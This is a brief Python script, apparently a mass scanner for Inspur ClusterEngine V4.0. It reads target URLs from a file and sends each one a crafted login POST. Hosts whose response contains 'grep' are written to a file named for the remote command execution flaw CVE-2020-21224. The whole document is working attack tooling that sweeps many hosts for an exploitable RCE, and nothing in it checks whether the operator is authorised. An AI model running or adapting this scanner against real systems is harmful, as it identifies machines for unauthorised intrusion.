import requests
import time

data = "op=login&username=''&password="

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest"
}

for url in open("浪潮ClusterEngine.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.post(url+"/login", headers=headers, data=data, verify=False, timeout=5)
        if ("grep" in jiaoyan.text) and (jiaoyan.status_code == 200):
            with open("浪潮ClusterEngineV4.0 远程命令执行(CVE-2020-21224) vul.txt", "a+") as f:
                f.write(url+"\n")
    except:
        continue